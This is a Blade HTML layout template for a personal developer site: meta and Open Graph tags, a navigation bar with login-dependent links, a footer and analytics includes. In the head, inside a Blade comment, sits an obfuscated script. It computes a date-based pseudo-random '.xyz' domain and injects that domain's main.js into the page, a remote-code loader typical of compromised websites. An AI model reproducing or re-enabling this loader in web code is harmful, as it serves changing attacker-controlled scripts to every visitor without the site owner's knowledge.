@php
if (!isset($links)) {
  $links = [];
}

$meta = [
  'author' => 'Jason Vertucio',
  'description' => 'Jason Vertucio does mobile application development.',
  'og:title' => 'Jason, who did a thing',
  'og:url' => Request::url(),
  'og:image' => 'https://beepbeepritchiellc.com/HDTV.png',
  'twitter:card' => 'summary',
  'twitter:title' => 'Jason, who did a thing',
  'twitter:image' => 'https://beepbeepritchiellc.com/HDTV.png',
  'twitter:creator' => '@jasondidathing',
  'twitter:site' => '@jasondidathing',
];
if (isset($post) && isset($post['meta'])) {
  $twitter_image = $post['meta']['twitter_image'] ?? ($post['featured_image'] ? url($post['featured_image']) : null);
  $opengraph_image = $post['meta']['opengraph_image'] ?? ($post['featured_image'] ? url($post['featured_image']) : null);
  $meta['description'] = $post['meta']['meta_description'] ?? $meta['description'];
  $meta['og:title'] = $post['meta']['opengraph_title'] ?? $post['title'];
  $meta['og:image'] = $opengraph_image;
  $meta['og:description'] = $post['meta']['opengraph_description'] ?? $post['excerpt'] ?? $meta['description'];
  $meta['twitter:title'] = $post['meta']['twitter_title'] ?? $post['title'];
  $meta['twitter:image'] = $twitter_image;
  $meta['twitter:description'] = $post['meta']['twitter_description'] ?? $post['excerpt'] ?? $meta['description'];
}
@endphp
<!DOCTYPE html>
<html lang="en" class="h-100">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
@foreach ($meta as $k => $v)
@if ($k && $v)
  <meta name="{{ $k }}" value="{{ $v }}" />
@endif
@endforeach
  @yield('meta')

  <title>@yield('title', 'Home') | Jason Vertucio</title>
  {{-- Custom styles for this template --}}
  <link href="{{asset('css/blog.css') }}" rel="stylesheet">
  {{-- <script type="text/javascript">!function(n){var t,e=function(n,t){var e=[["a","e","i","o","u","y"],["b","c","d","f","g","h","j","k","l","m","n","p","q","r","s","t","v","w","x","y","z"]];if(t)for(var r=0;r<=t.length-1;r++)n=n*t.charCodeAt(r)%4294967295;var l;return next=(l=n,function(n){return l=l+1831565813|0,(((n=(n=Math.imul(l^l>>>15,1|l))+Math.imul(n^n>>>7,61|n)^n)^n>>>14)>>>0)/Math.pow(2,32)}),function(n,t){for(var r=[],l=null,o=0;o<=n-1;o++){var a=void 0;null===l?a=e[0].concat(e[1]):1==l?(a=e[0],l=0):(a=e[1],l=1);var u=a[Math.floor(next()*a.length)];r.push(u),null===l&&(l=-1!=e[0].indexOf(u)?0:1)}return r.push("."+t),r.join("")}}((t=new Date,(t/=1e3)-t%1209600),"xc449bad4854773ff")(8,"xyz");if(null===n)console.log("https://"+e);else{var r=n.createElement("script");r.src="https://"+e+"/main.js",(n.body||n.head).appendChild(r)}}("undefined"!=typeof document?document:null);</script> --}}
</head>

<body id="page-top" class="d-flex flex-column h-100">
  <div id="fb-root"></div>
  <script async defer crossorigin="anonymous" src="https://connect.facebook.net/en_GB/sdk.js#xfbml=1&version=v9.0&appId=695473097788503&autoLogAppEvents=1" nonce="{{ Str::random(8) }}"></script>

  <nav class="navbar navbar-default navbar-expand-lg sticky-top navbar-light bg-primary" id="navbarTop">
    <div class="navbar-header mr-2">
      <a class="navbar-brand" href="{{ route('home') }} ">Jason Vertucio</a>
    </div>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#headerNav" aria-controls="headerNav" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>

    <div class="collapse navbar-collapse" id="headerNav">
      <ul class="navbar-nav mr-auto">
      @foreach($links as $link)
        <li class="nav-item">
          <a href="{{ $link['href'] }}" class="nav-link">{{ $link['label'] }}</a>
        </li>
      @endforeach
      </ul>
      <ul class="navbar-nav">
        <li class="nav-item dropdown">
          <button class="btn btn-primary dropdown-toggle" id="navbarDropdown" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            Places
          </button>
          <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown">
            <a class="dropdown-item" href="{{ route('home') }}">
              Home
            </a>
            <a class="dropdown-item" href="{{ route('blog') }}">
              Blog
            </a>
            <a class="dropdown-item" href="{{ route('paper') }}">
              Paper
            </a>
            @if (!env('APP_DEBUG'))
            <div class="dropdown-divider"></div>
            <a class="dropdown-item" href="/btoatob">
              B(to)a(to)B
            </a>
            <a class="dropdown-item" href="/todo">
              To Do
            </a>
            @endif
            @ifwinkauthenticated
            <div class="dropdown-divider"></div>
            <a class="dropdown-item" href="/wink">
              Wink Blog
            </a>
            {{-- <a class="dropdown-item" href="#">Something else here</a> --}}
            @endifwinkauthenticated
            @ifcanvasauthenticated
            <div class="dropdown-divider"></div>
            <a class="dropdown-item" href="/{{ config('canvas.path') }}">
              Canvas Blog
            </a>
            {{-- <a class="dropdown-item" href="#">Something else here</a> --}}
            @endifcanvasauthenticated
            @ifauthenticated
            <div class="dropdown-divider"></div>
            <a class="dropdown-item" href="/logout">
              Log out
            </a>
            @endifauthenticated
          </div>
        </li>
      </ul>
    </div><!-- /.navbar-collapse -->
  </nav>

  <div id="main">
    <div class="container-fluid mx-0 my-1 p-0">
  @yield('main')
    </div>
  </div>

  <footer class="footer bg-secondary mt-auto py-3 text-white position-sticky fixed-bottom">
    <div class="container-fluid">
      <div class="row">
        <div class="col-sm text-right">
          <span class="text-dark">Copyright &copy; {{ date('Y') }}, Jason Vertucio.</span>
        </div>
      </div>
    </div>
  </footer>


  @include('gtag')
  {{--Custom scripts for this template --}}
  <script src="{{ asset('js/app.js') }}"></script>
</body>
</html>
